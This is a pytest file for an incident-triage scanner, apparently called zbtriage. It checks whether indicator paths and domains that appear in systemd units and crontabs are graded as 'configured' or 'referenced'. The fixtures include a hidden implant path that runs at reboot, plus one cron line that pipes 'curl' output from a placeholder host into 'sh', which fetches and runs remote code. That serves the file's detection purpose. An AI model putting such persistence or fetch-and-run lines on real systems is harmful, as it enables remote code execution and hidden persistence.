"""The program a systemd unit or crontab line runs is graded like a desktop
entry's Exec: a published path there is "configured" (activation unverified).
Arguments, network names included, stay references on every platform."""
import os
import sys

import pytest

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from zbtriage.context import ScanContext
from zbtriage.iocs import Indicator, IocSet
from zbtriage.modules import posix
from test_followup_fixes import bundle

PROGRAM = "/var/tmp/.fixture-implant"


def _ctx():
    inds = [Indicator("fixture.invalid", "infrastructure", "primary", "domain", "fixture"),
            Indicator(PROGRAM, "artifact", "primary", "file-path", "fixture")]
    return ScanContext(IocSet(inds, "fixture", None), emit=lambda text: None)


@pytest.fixture(params=("source", "bundle"))
def api(request, bundle):
    return posix if request.param == "source" else bundle


def _grades(api, monkeypatch, tmp_path, kind, filename, text):
    (tmp_path / filename).write_text(text)
    root = tmp_path / filename if kind.endswith("-file") else tmp_path
    monkeypatch.setattr(api, "_ux_roots", lambda: [("synthetic", str(root), kind)])
    result = (api.run if api is posix else api.run_posix)(_ctx())
    assert result.checked == 1
    return sorted((h.indicator, h.evidence) for h in result.hits)


@pytest.mark.parametrize("kind,filename,text", [
    ("unit", "x.service", "[Service]\nExecStart=" + PROGRAM + " --daemon\n"),
    ("unit", "x.service", "[Service]\nExecStartPre=-" + PROGRAM + "\n"),
    ("unit", "x.service", '[Service]\nExecStart="' + PROGRAM + '" %h $ARG\n'),
    ("cron", "job", "*/5 * * * * root " + PROGRAM + " >/dev/null 2>&1\n"),
    ("cron-file", "crontab", "SHELL=/bin/sh\n@reboot root " + PROGRAM + "\n"),
    ("user-cron", "user", "# m h dom mon dow command\n0 3 * * * " + PROGRAM + "\n"),
])
def test_program_a_unit_or_crontab_runs_is_configured(api, monkeypatch, tmp_path, kind, filename, text):
    assert _grades(api, monkeypatch, tmp_path, kind, filename, text) == [(PROGRAM, "configured")]


@pytest.mark.parametrize("kind,filename,text", [
    # Mentioned, not run: a comment, an argument, an [Install] key, an
    # environment value, a continued Exec line.
    ("unit", "x.service", "[Service]\n# " + PROGRAM + "\nExecStart=/bin/echo " + PROGRAM + "\n"),
    ("unit", "x.service", "[Install]\nExecStart=" + PROGRAM + "\n"),
    ("unit", "x.service", "[Service]\nExecStart=" + PROGRAM + " \\\n  --more\n"),
    ("cron", "job", "PATH=" + PROGRAM + "\n* * * * * root /bin/echo " + PROGRAM + "\n"),
    ("user-cron", "user", "* * * * * cat " + PROGRAM + " %stdin\n"),
])
def test_mentions_stay_references(api, monkeypatch, tmp_path, kind, filename, text):
    assert _grades(api, monkeypatch, tmp_path, kind, filename, text) == [(PROGRAM, "referenced")]


def test_network_name_in_a_crontab_command_stays_a_reference(api, monkeypatch, tmp_path):
    text = "@reboot root curl -s https://fixture.invalid/x | sh\n"
    assert _grades(api, monkeypatch, tmp_path, "cron", "job", text) == [
        ("fixture.invalid", "referenced")]


def test_cron_scripts_are_not_parsed_as_crontabs(api, monkeypatch, tmp_path):
    text = "#!/bin/sh\n" + PROGRAM + "\n"
    assert _grades(api, monkeypatch, tmp_path, "cron-script", "job", text) == [
        (PROGRAM, "referenced")]
